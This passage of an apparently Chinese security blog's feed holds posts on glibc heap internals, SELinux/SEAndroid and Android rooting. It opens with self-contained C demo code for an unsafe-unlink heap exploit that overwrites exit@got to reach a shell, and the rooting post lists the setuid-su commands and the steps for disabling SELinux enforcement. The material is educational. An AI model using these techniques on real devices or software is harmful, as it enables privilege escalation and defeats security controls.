class="line">    <span class="comment">// Fake</span></span><br><span class="line">    <span class="keyword">uint32_t</span> *chunk0 = (<span class="keyword">uint32_t</span>)<span class="built_in">malloc</span>(malloc_size);</span><br><span class="line">    chunkList[<span class="number">0</span>] = chunk0;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint32_t</span> *chunk1 = (<span class="keyword">uint32_t</span>)<span class="built_in">malloc</span>(malloc_size);</span><br><span class="line">    chunkList[<span class="number">1</span>] = chunk1;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"chunk0 address is : %p\n"</span>, &amp;chunk0);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"chunk1 address is : %p\n"</span>, &amp;chunk1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get chunk and attack it. </span></span><br><span class="line">    <span class="keyword">uint32_t</span> *getChunk0 = chunkList[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">uint32_t</span> *getChunk1 = chunkList[<span class="number">1</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Set chunk0-&gt;fd &amp;&amp; chunk0-&gt;bk</span></span><br><span class="line">    getChunk0[<span class="number">2</span>] = (<span class="keyword">uint32_t</span>)&amp;getChunk0 - <span class="number">0xc</span>; <span class="comment">// (sizeof(uint32_t) * 3);</span></span><br><span class="line">    getChunk0[<span class="number">3</span>] = (<span class="keyword">uint32_t</span>)&amp;getChunk0 - <span class="number">0x8</span>; <span class="comment">// (sizeof(uint32_t) * 2);</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// Set chunk1 prev_size &amp;&amp; clear flag</span></span><br><span class="line">    <span class="keyword">uint32_t</span> *chunk1_hdr = chunk1 - header_size;</span><br><span class="line">    chunk1_hdr[<span class="number">0</span>] = malloc_size;</span><br><span class="line">    chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// free chunk1 and trigger unlink.</span></span><br><span class="line">    <span class="comment">// After this, chunk0-&gt;bk = chunk0</span></span><br><span class="line">    <span class="built_in">free</span>(getChunk1);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// So we just need set bk = exit@got and chunk0 = &amp;getShell</span></span><br><span class="line">    getChunk0[<span class="number">3</span>] = <span class="number">0x0804a020</span>; <span class="comment">// exit@got</span></span><br><span class="line">    getChunk0[<span class="number">0</span>] = &amp;getShell;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Excute exit and it will jump to getShell</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o vulnerability_unsafelink vulnerability_unsafelink.c  -g -w</span><br></pre></td></tr></table></figure><p><strong>获得exit@got：</strong>结果为0x0804a020</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -R vulnerability_unsafelink</span><br></pre></td></tr></table></figure><p><strong>执行:</strong></p><p><img src="https://raw.githubusercontent.com/CytQ/BlogImgs/master/heapOverflow/unsafeunlink_demo.png" alt="run result"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前文&lt;a href=&quot;http://imlzq.com/2018/07/03/Linux%20%E5%A0%86/&quot;&gt;Linux 堆&lt;/a&gt;介绍了Linux的堆管理策略，这篇文章就介绍一下堆的溢出攻击方式之一：unsafe unlink.&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Linux" scheme="http://imlzq.com/tags/Linux/"/>
    
      <category term="堆溢出" scheme="http://imlzq.com/tags/%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Linux 堆</title>
    <link href="http://imlzq.com/2018/07/03/Linux%20%E5%A0%86/"/>
    <id>http://imlzq.com/2018/07/03/Linux 堆/</id>
    <published>2018-07-02T16:00:00.000Z</published>
    <updated>2019-05-02T08:43:28.426Z</updated>
    
    <content type="html"><![CDATA[<p>堆的管理策略取决于各操作系统的堆管理器实现。之前看Windows、Linux，发现他们是存在一些区别的。虽然总的策略类似但在一些细微实现上有很大的区别。</p><p>所以本文就着重介绍一下Linux/Android的堆管理策略吧，一些个人理解就想到什么写什么了。网上这方面的内容也很多。推荐下面两个：</p><ul><li><a href="https://www.cnblogs.com/alisecurity/p/5486458.html" target="_blank" rel="noopener">Linux堆内存管理深入分析(上半部)</a></li><li><a href="https://www.cnblogs.com/alisecurity/p/5520847.html" target="_blank" rel="noopener">Linux堆内存管理深入分析(下部分)</a></li></ul><a id="more"></a>    <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>在以前的博客中有介绍到，对于Android的进程来说，每个进程内部都是一个大的虚拟地址空间。对于已经划分的区域，均会创建一个vm_area_struct结构并将其链接到进程维护的vm_area_struct链表当中。vm_area_struct结构会包含这块区域的起始位置、next指针，flag等等。而我们的堆、栈就属于这样的一个vm_area_struct结构。</p><h2 id="堆的初始化"><a href="#堆的初始化" class="headerlink" title="堆的初始化"></a>堆的初始化</h2><p>堆会在程序第一次请求分配内存的时候初始化，即第一次调用malloc的时候。</p><p>我们在开发或者配置系统环境的过程中，经常能看到一些关于堆最小值、最大值的参数，这些就会在堆初始化的过程中进行读取。</p><h2 id="堆的拓展"><a href="#堆的拓展" class="headerlink" title="堆的拓展"></a>堆的拓展</h2><p>当堆第一次创建完成后，它的范围大小还未达到最大。当我们发现目前区域的剩余内存不够分时就需要再拓展我们的堆，直至它达到maximum。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">brk</span><span class="params">(<span class="keyword">void</span> *end_data_segment)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">sbrk</span><span class="params">(<span class="keyword">ptrdiff_t</span> increment)</span></span>;</span><br></pre></td></tr></table></figure><p><strong>系统提供了两个方法：</strong></p><ul><li>brk:增大堆边界到指定位置</li><li>sbrk：增大指定数</li></ul><p><strong>他们的描述如下：</strong></p><blockquote><p>brk sets the end of the data segment to the value specified by end_data_segment, when that value is reasonable, the system does have enough memory and the process does not exceed its max data size (see setrlimit(2)).</p><p>sbrk increments the program’s data space by increment bytes. sbrk isn’t a system call, it is just a C library wrapper. Calling sbrk with an increment of 0 can be used to find the current location of the program break</p></blockquote><p>brk为系统调用，sbrk为brk的子集，就是它的二次封装。当区域不够时，堆会调用sbrk去增大</p><h2 id="超大内存块的内配"><a href="#超大内存块的内配" class="headerlink" title="超大内存块的内配"></a>超大内存块的内配</h2><blockquote><p>堆分配内存其实是从操作系统中割下一块区域给自己用，等到合适的实际再返回给操作系统。那么以正常的开发思维来看，在堆管理器中建立缓存是非常有必要的，这样能避免出现频繁的系统IO。</p></blockquote><p>但对于超大内存块来说，其实就没有太大的必要缓存它了，因为缓存和回收再利用的成本其实非常大。试想下面这情况：</p><ol><li>内存1000，此时分配了900的超大内存</li><li>该超大内存被释放</li><li>程序接下来的所有操作均为小内存分配，也就是10、20byte的来。</li><li>那么这剩余的800多byte就被白白浪费了</li></ol><p><strong>所以Linux的堆管理器在应对超大内存块时，都会直接使用mmap在off-heap区域分配一块大内存，一旦释放，则直接unmmap将其归还给系统。</strong></p><p>超大内存块的判定根据系统位数和具体的堆管理决定，32位一般是128KB起</p><blockquote><p>Very large allocation requests <a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l866" target="_blank" rel="noopener">get special treatment</a> in the heap manager. These large chunks are allocated off-heap using a direct call to <em>mmap</em>, and this fact is marked using a flag in the chunk metadata. When these huge allocations are later returned to the heap manager via a call to <em>free</em>, the heap manager releases the entire <em>mmap</em>ed region back to the system via <em>munmap</em>.</p><p>By default this threshold is 128KB up to 512KB on 32-bit systems and 32MB on 64-bit systems, however this threshold can also dynamically increase if the heap manager detects that these large allocations are being used transiently.</p></blockquote><h2 id="小内存块的分配（相对于大内存块的概念）"><a href="#小内存块的分配（相对于大内存块的概念）" class="headerlink" title="小内存块的分配（相对于大内存块的概念）"></a>小内存块的分配（相对于大内存块的概念）</h2><p>堆分配的单位被称为块chunk。在堆第一次初始化后，堆中只有一个topChunk。之后的每次切割都会从中切出一部分，剩余的部分继续当成topChunk</p><p>首先介绍Linux堆的几类chunk List。除了unsortbin无size大小限制外，其余的3个都会有：</p><ul><li>fastbin: 单向链表，无合并操作（除非空闲堆块数量超过阈值，才会合并后放入UnsortBin）。对应16~88 bytes的堆块</li><li>unsortbin:双向链表，处于binList的第0位。内部存放的堆块无大小限制</li><li>smallbin：双向链表，处于binList的第1~62位，总共62个块。对应大小小于512 bytes的堆块</li><li>largebin：双向链表，处于binList的第63~125位，总共63个块。对应大小大于512 bytes的堆块</li></ul><p>上面提到了一个binList，其实就是unsortbin,smallbin,largebin的管理类，通过它就可以快速定位到指定的bin区域，它与fastbin同级。</p><p>图解就是：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fastbin</span><br><span class="line"></span><br><span class="line">unsortbin</span><br><span class="line">binList -&gt;  smallbin</span><br><span class="line">largebin</span><br></pre></td></tr></table></figure><h3 id="堆块的合并"><a href="#堆块的合并" class="headerlink" title="堆块的合并"></a>堆块的合并</h3><p>上面提到了堆块的合并，这是啥呢？</p><ul><li>堆释放chunkB时发现它物理相连的chunkA也处于空闲状态，就会把自己和A合并从而构建一个新的大块，此为向后合并（这名字有点怪，其实就是让A的范围包含B，所以叫向后）</li><li>如果释放chunkB时发现它物理相连的chunkC也处于空闲状态，就会把自己和C合并从而构建一个新的大块，此为向前合并。</li><li>如果free(ChunkA)时发现它和topChunk物理相邻，那么将其合并到topChunk中</li></ul><h3 id="Chunk的格式"><a href="#Chunk的格式" class="headerlink" title="Chunk的格式"></a>Chunk的格式</h3><p><img src="https://azeria-labs.com/wp-content/uploads/2019/03/chunk-freed-CS.png" alt="Chunk格式"></p><p>从上到下可以看到，一个空闲堆块的结构布局依次为prev_size, chunkSize &amp; flag, fd pointer, bk pointer, fd_nextsize, bk_nextsize, content。</p><p>一个非空闲堆块的结构布局就很简单了，PREV_SIZE, chunkSize &amp; flag, content</p><ul><li><p><strong>对于unsort bin, small bin而言：</strong>不存在fd_next_size, bk_nextsize</p></li><li><p>chunkSize后面的flag非常重要，他有三个标志位：</p><ul><li>A用于表示分配的arena是main arena还是其他arena(在本文的下个内容介绍)</li><li>M用于表示该堆块是否由mmap分配，如果是，那么释放的时候该chunk会走unmmap的途径</li><li>P用于表示前一个堆块是否处于使用状态，用于判断是否需要合并</li></ul></li><li><p>PREV_SIZE，chunkSize&amp;flag这些在32位的系统上为4字节，16为系统为8字节</p></li><li><p>使用malloc返回的指针为chunkSize&amp;flag结束的位置，即fd的开始。且malloc(8)得到的实际大小会再额外加上PREV_SIZE和CHUNK_SIZE占用的大小</p></li><li><p>malloc存在字节对齐，比如1024byte的数据在32位上刚好是8位对齐，可以直接分配。那如果分配1028的数据该怎么办呢？</p><ul><li>答案是分配1024个字节，剩余的4个字节占用下个堆块的PREV_SIZE部分</li></ul></li><li><p>使用calloc分配内存块时，它会clear掉content区域的内容，这样就不会造成数据的重复使用了</p></li><li><p>使用malloc分配内存块时，会直接返回指向该chunk的指针，并不会清除该chunk的内容。那么就可能造成数据的反复使用。</p><ul><li>如：A=malloc(8).  </li><li>setTxt(A).</li><li>free(A). </li><li>B = malloc(8). print getTxt(B)</li><li>会发现打印的结果就是A设置的内容</li></ul></li></ul><h3 id="What-is-arena"><a href="#What-is-arena" class="headerlink" title="What is arena"></a>What is arena</h3><p>这其实是为了应对多线程。多线程的资源竞争、同步、锁在任何情况都是一个大问题。如果堆管理没有应对好，那么面对的会是程序崩溃。因此Linux的堆管理器ptmalloc使用了arena的概念。</p><blockquote><p>Each arena is essentially an entirely different heap that manages its own chunk allocation and free bins completely separately. Each arena still serializes access to its own internal data structures with a mutex, but threads can safely perform heap operations without stalling each other so long as they are interacting with different arenas.</p></blockquote><p>即：每个arena都是一个完全独立的堆，拥有并管理自己的chunk分配和free。这在一定程度上是能应对多线程并发的。</p><p>只不过也正因为每个arena都有自己的堆，因此操作系统一定需要堆它的数量做限制，不然其他程序还活不活了？arena的数量上限在32位的系统上是2倍CPU核，64位上时8倍。</p><p><strong>So the process is :</strong></p><ul><li>创建Main arena</li><li>创建线程A，发现arena数量未达上限，则创建arenaA</li><li>如果此时发现arena数量达到上限，那么便会尝试去arenaList，从而锁定一个arena去使用（就进原则）</li><li>如果遍历完了都没找到，那就挂起，等待叫醒</li></ul><h3 id="分配堆块的流程"><a href="#分配堆块的流程" class="headerlink" title="分配堆块的流程"></a>分配堆块的流程</h3><p>以fastbin举例，smallBin和largeBin是类似的</p><p><strong>创建30byte的堆块：</strong></p><ol><li>属于fastbin，尝试分配</li><li>【情况一】此时系统还未初始化fastbin这个链表，故无法分配</li><li>往后传递给smallBin尝试分配，发现也未初始化，说明此时的binList也没初始化。故程序会调用Init函数初始化binList和fastbin，之后就可以在fastbin中分配数据了</li><li>【情况二】如果此时存在fastbin链表，那么根据堆块大小从前到后依次寻找到一个最合适的chunk去分配。如果刚好够，直接取下来即可。如果有剩余，那么就把剩余的chunk放入unsortChunk</li><li>【情况三】fastbin链表遍历完成，但未发现一个合适的chunk，将进入unsortChunk的遍历过程。</li><li>【情况四】unsortBin也搞不定，那就从topChunk分配</li><li>【情况五】topChunk也搞不定，那就压缩和回收fastbin，把空闲堆块放入unsortBin中。之后尝试再分配</li><li>【情况六】还不行，那就调用sbrk增大topChunk</li><li>【情况七】已达堆的上限，返回失败</li></ol><h3 id="释放堆块的流程"><a href="#释放堆块的流程" class="headerlink" title="释放堆块的流程"></a>释放堆块的流程</h3><p>释放就很简单了，该合并的合并（有与前后合并的，也有和topChunk合并的），该放到binList或者fastbin的就放进去。</p><p>只是这里要注意一点，free之前堆管理器会校验当前chunk的合法性，从而防止内存损坏或者double free.校验措施如下：</p><ul><li>p-&gt;fd-&gt;bk = p</li><li>p-&gt;bk-&gt;fd = p</li><li>p-&gt;nextChunk-&gt;prev_size = p.size</li><li>获取当前bin的头部是否与自己相等，如果相同，那意味着doubleFree了<ul><li>如free(A)，此时bin的头部指向A。</li><li>接着再free(A)，发现匹配，异常退出</li></ul></li></ul><p><strong>Double free</strong></p><p>其实之所以会出现double free，主要是因为free这个操作会把当前chunk放入bin。如果依次free A,B,A，再连续malloc 3次，那么第一次malloc和第三次malloc指向的会是同一个chunk。这样的话修改第一个malloc就会直接影响到第三个chunk。</p><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul><li><a href="https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/" target="_blank" rel="noopener">Arm Heap Exploitation:PART 1: UNDERSTANDING THE GLIBC HEAP IMPLEMENTATION</a></li><li><a href="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/" target="_blank" rel="noopener">PART 2: UNDERSTANDING THE GLIBC HEAP IMPLEMENTATION</a></li><li><a href="https://www.cnblogs.com/alisecurity/p/5486458.html" target="_blank" rel="noopener">Linux堆内存管理深入分析(上半部)</a></li><li><a href="https://www.cnblogs.com/alisecurity/p/5520847.html" target="_blank" rel="noopener">Linux堆内存管理深入分析(下部分)</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;堆的管理策略取决于各操作系统的堆管理器实现。之前看Windows、Linux，发现他们是存在一些区别的。虽然总的策略类似但在一些细微实现上有很大的区别。&lt;/p&gt;
&lt;p&gt;所以本文就着重介绍一下Linux/Android的堆管理策略吧，一些个人理解就想到什么写什么了。网上这方面的内容也很多。推荐下面两个：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/alisecurity/p/5486458.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Linux堆内存管理深入分析(上半部)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.cnblogs.com/alisecurity/p/5520847.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Linux堆内存管理深入分析(下部分)&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
      <category term="Linux" scheme="http://imlzq.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>SELinux和SEAndroid</title>
    <link href="http://imlzq.com/2018/06/28/SELinux%E5%92%8CSEAndroid/"/>
    <id>http://imlzq.com/2018/06/28/SELinux和SEAndroid/</id>
    <published>2018-06-27T16:00:00.000Z</published>
    <updated>2019-05-01T08:40:43.041Z</updated>
    
    <content type="html"><![CDATA[<p>本文记录一些SELinux和SEAndroid的内容</p><a id="more"></a>    <h2 id="DAC和MAC访问策略"><a href="#DAC和MAC访问策略" class="headerlink" title="DAC和MAC访问策略"></a>DAC和MAC访问策略</h2><p>标准的Linux安全策略被称为DAC（自主访问控制）。主要的策略是根据UID和GID去配置文件的读、写和可执行状态。如：-rwxr-xr-x</p><p>但DAC控制策略的颗粒度其实很大，因为它是以文件为单位的。试想如下情况：</p><ul><li>程序需要获取高权限资源A\B</li><li>A函数用于调用资源A</li><li>B函数用于调用资源B</li><li>因此DAC会同时赋予该程序调用资源AB的权限</li><li>攻击者在A函数中找到一个可利用漏洞接触到资源B</li><li>因为权限校验成功，攻击者成功接触到资源B</li></ul><p>所以就引入了下面的强访问控制策略MAC：</p><ul><li>它颗粒度更细，精确到某次操作。</li><li>上个例子中的函数A调用资源A，那么在系统赋予程序权限时就不会赋予它资源B的权限</li></ul><h2 id="SELinux和SEAndroid"><a href="#SELinux和SEAndroid" class="headerlink" title="SELinux和SEAndroid"></a>SELinux和SEAndroid</h2><p>这两位大哥是作为Linux标准安全策略的补充来设定。即当我们去访问某个文件时，会先用DAC判断我是否存在目标文件的读/写/执行权限。如果都没问题，就再交付给SELinux或SEAndroid。</p><blockquote><p>SEAndroid是SELinux在Android上的补充，结合了一些Android的特性。所以下面介绍时，如果只讲述了SELinux，那么在SEAndroid上也是一样的</p></blockquote><p>对于Linux系统来说，存在超级用户Root，只要Root想做，那就没什么不可能。</p><p>但在SELinux中，则没有这个概念。它属于一种悲观策略，即默认情况瞎任意用户访问任意文件都是非法的。</p><p>网上介绍SELinux和SEAndroid的文章很多，我从中截取了一部分再做了些自我理解，尽量把它们精简到几句话之中。</p><p>Linux系统为每个进程、文件都设置一个安全上下文，安全上下文的格式为USER:ROLE:TYPE:LEVEL</p><h3 id="USER"><a href="#USER" class="headerlink" title="USER"></a>USER</h3><ul><li>user_u: 普通用户登录系统后的预设</li><li>system_u：开机过程中系统进程的预设</li><li>root: Root登录后的预设</li></ul><p>在Android中，自定义了一个用户u</p><h3 id="ROLE"><a href="#ROLE" class="headerlink" title="ROLE"></a>ROLE</h3><ul><li><p>文件、目录、设备的role通常为object_r</p></li><li><p>进程的role通常记为r</p></li><li><p>用户的role根据policy的不同有区别。targeted policy为system_r； strict policy为sysadm_r、staff_r、user_r。</p></li></ul><p>  用户的role，类似系统中的GID，不同角色具备不同的的权限；用户可以具备多个role；但是同一时间内只能使用一个role</p><h3 id="TYPE"><a href="#TYPE" class="headerlink" title="TYPE"></a>TYPE</h3><ul><li><p>type：用来将主体(subject)和客体(object)划分为不同的组，给每个主体和系统中的客体定义了一个类型；为进程运行提供最低的权限环境</p></li><li><p>当一个类型与执行中的进程相关联时，其type也称为domain</p></li><li><p>type是SElinux security context 中最重要的部位，是 SELinux Type Enforcement 的心脏，预设值以_t结尾</p></li></ul><h3 id="LEVEL"><a href="#LEVEL" class="headerlink" title="LEVEL"></a>LEVEL</h3><p>安全等级</p><h2 id="Android中的应用"><a href="#Android中的应用" class="headerlink" title="Android中的应用"></a>Android中的应用</h2><ul><li>应用程序安装服务PackageManagerService在启动的时候，会在/etc/security目录中mac_permissions.xml文件，然后对它进行解析，得到App签名或者包名与seinfo的对应关系。当PackageManagerService安装App的时候，它就会根据其签名或者包名查找到对应的seinfo，并且将这个seinfo传递给另外一个守护进程installed。</li><li>守护进程installd负责创建App数据目录。 在创建App数据目录的时候，需要给它设置安全上下文，使得SEAndroid安全机制可以对它进行安全访问控制。Installd根据PackageManagerService传递过来的seinfo，并且调用libselinux库提供的selabel_lookup函数到seapp_contexts文件中查找到对应的Type。有了这个Type之后，installd就可以给正在安装的App的数据目录设置安全上下文了，这是通过调用libselinux库提供的lsetfilecon函数来实现的。</li><li>ActivityManagerService在请求Zygote进程创建应用程序进程之前，会到PackageManagerService中去查询对应的seinfo，并且将这个seinfo传递到Zygote进程。于是，Zygote进程在fork一个应用程序进程之后，就会使用ActivityManagerService传递过来的seinfo，并且调用libselinux库提供的selabel_lookup函数到seapp_contexts文件中查找到对应的Domain。有了这个Domain之后，Zygote进程就可以给刚才创建的应用程序进程设置安全上下文了，这是通过调用libselinux库提供的lsetcon函数来实现的。</li><li>Init进程在启动的时候，会创建一块内存区域来维护系统中的属性以及Property服务。 这个Property服务通过socket提供接口给其它进程访问Android系统中的属性。其它进程通过socket来和Property服务通信时，Property服务可以获得它的安全上下文。有了这个安全上下文之后，Property服务就可以通过libselinux库提供的selabel_lookup函数到property_contexts去查找要访问的属性的安全上下文了。有了这两个安全上下文之后，Property服务就可以决定是否允许一个进程访问它所指定的属性了。</li></ul><p>只有当进程和文件都关联安全上下文之后，SEAndroid安全策略才能发挥作用。也就是说，当一个进程试图访问一个文件时，SEAndroid会将进程和文件的安全上下文提取出来，根据安全策略规则，决定是否允许访问</p><h2 id="安全策略"><a href="#安全策略" class="headerlink" title="安全策略"></a>安全策略</h2><p>那真正校验访问策略的时候是怎么做的呢？</p><p>类型强制访问控制(TE)通过指定主体类型（即域）和客体类型使用 allow 规则授予访问权限，allow 规则由四部分组成：</p><ul><li>源类型（Source type(s)）：通常是尝试访问的进程的域类型</li><li>目标类型（Target type(s)）： 被进程访问的客体的类型</li><li>客体类别（Object class(es)）： 指定允许访问的客体的类型</li><li>许可（Permission(s)）： 象征目标类型允许源类型访问客体类型的访问种类</li></ul><p>下面以 Android 中一个例子说明 TE 是如何工作的。</p><p> <code>ls -Z | grep proc</code>，可看到 proc 目录的安全上下文如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dr-xr-xr-x root     root              u:object_r:proc:s0 proc</span><br></pre></td></tr></table></figure><p>再运行 <code>ps -Z | grep adbd</code>，看看进程 adbd 的安全上下文：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u:r:su:s0                      root      2935  1     /sbin/adbd</span><br></pre></td></tr></table></figure><p>目录 proc 和进程 adbd 各自有自己的安全上下文，安全上下文实际上是附加在对象上的一个标签，由用户、角色、类型和安全级别四部分组成，由冒号隔开。在 SEAndroid 里，只定义了一个用户 u，所以文件和进程安全上下文中，所有的用户都为 u。文件的角色一般都为 object_r，而进程的角色固定为 r。用户和角色定义得这么随意，是因为对安全策略来说它们并不重要，在类型强制访问控制的安全上下文中，最重要的就是类型，它才是定义规则时需要的。假如要想通过 adb 读写 proc 目录下的文件节点，则需要定义如下一条规则来授权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allow init proc:dir rw_dir_perms;</span><br></pre></td></tr></table></figure><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul><li><a href="https://blog.csdn.net/hsluoyc/article/details/50560782" target="_blank" rel="noopener">Android Root原理分析及防Root新思路</a></li><li><a href="https://www.ibm.com/developerworks/cn/linux/l-selinux/index.html" target="_blank" rel="noopener">安全增强 Linux (SELinux) 剖析</a></li><li><a href="https://blog.csdn.net/hsluoyc/article/details/50564992" target="_blank" rel="noopener">SEAndroid原理分析</a></li><li><a href="http://kernel.meizu.com/linux-selinux-intro.html" target="_blank" rel="noopener">SELinux 安全策略解析</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文记录一些SELinux和SEAndroid的内容&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Android Root</title>
    <link href="http://imlzq.com/2018/06/27/Android%20Root/"/>
    <id>http://imlzq.com/2018/06/27/Android Root/</id>
    <published>2018-06-27T14:00:00.000Z</published>
    <updated>2019-05-01T12:45:09.335Z</updated>
    
    <content type="html"><![CDATA[<p>本文记录一些Android Root相关的内容</p><a id="more"></a>    <p>标准的Linux安全策略被称为DAC（自主访问控制）。主要的策略是根据UID和GID去配置文件的读、写和可执行状态。如：-rwxr-xr-x</p><h2 id="S"><a href="#S" class="headerlink" title="S"></a>S</h2><p>如：-rwsr-xr-x</p><p>如果一个文件被标记为了s，那就意味着任何执行这个文件的人都会以文件所有者的身份去执行。</p><h2 id="核心策略"><a href="#核心策略" class="headerlink" title="核心策略"></a>核心策略</h2><p>Android的root其实说白了就是把su这个二进制文件复制到/system/bin或者/system/xbin当中，从而让用户能执行它。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cp /data/tmp/su /system/bin/ #copy su 到/system/分区</span><br><span class="line">chown root:root su #su的所有者置成root</span><br><span class="line">chmod 4775 /system/bin/su #把su置成-rwsr-xr-x</span><br></pre></td></tr></table></figure><p>执行这三步均需要Root权限，所以接下来最重要的是就是找到系统进程存在的漏洞getShell并执行以上的三步操作。</p><h2 id="绕过SELinux"><a href="#绕过SELinux" class="headerlink" title="绕过SELinux"></a>绕过SELinux</h2><p>Android 4.3及以下SELinux默认为permissive状态，部分4.4及5.0为全量开启。在这种情况下，再调用su就不一定有权限了。</p><p><strong>绕过它有两种策略：</strong></p><ul><li>注入SELinux的安全管理策略：安全管理策略在系统启动时就已固化，无法直接修改</li><li>关闭SELinux</li></ul><p>第一种的最终目的是：安全管理策略中加入permissive su</p><p>第二种：</p><blockquote><ul><li>Open the <em>/proc/filesystems</em> file, search for the string <em>“selinuxfs”</em>, if the string exists, SELinux is running on this device.</li><li>If SELinux is running, open the <em>/proc/mounts</em> file, read the line that contains <em>“selinuxfs”</em>. In this line, we can extract the absolute path of SELinux directory.</li><li>Find a file named <em>“enforce”</em> in the SELinux directory, overwrite this file with a single “0”.</li></ul></blockquote><p><strong>其他的一些介绍：</strong></p><blockquote><p>Since the SELinux Policy restricts full access to the device in order to achieve root some of those restrictions need to be bypassed. How this is performed varies, but the end goal is the same : inject new permissions into the SELinux Policy to allow the root implementation full access to the device. If the root implementation is ethical then it should only inject permissions related to providing root access. Since root apps will likely require permissions not included in a device’s Stock SELinux Policy most root implementations provide tools for injecting permissions into the SELinux Policy at runtime (selinux-inject, supolicy &amp; magiskpolicy). Most root implementations also provide locations for startup scripts which are executed in a root context. These tools and scripts are used legitimately by the root implementation to maintain root access and by root apps to maintain stable functionality.</p></blockquote><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><ul><li><a href="https://blog.csdn.net/hsluoyc/article/details/50560782" target="_blank" rel="noopener">Android Root原理分析及防Root新思路</a></li><li><a href="https://shunix.com/bypass-selinux-on-android/" target="_blank" rel="noopener">Bypass SELinux on Android</a></li><li><a href="https://forum.xda-developers.com/general/general/discussion-root-selinux-risks-t3607295" target="_blank" rel="noopener">https://forum.xda-developers.com/general/general/discussion-root-selinux-risks-t3607295</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文记录一些Android Root相关的内容&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
      <category term="漏洞" scheme="http://imlzq.com/tags/%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>整数溢出</title>
    <link href="http://imlzq.com/2018/04/25/Integer_OverFlow/"/>
    <id>http://imlzq.com/2018/04/25/Integer_OverFlow/</id>
    <published>2018-04-24T16:00:00.000Z</published>
    <updated>2018-04-27T08:03:00.698Z</updated>
    
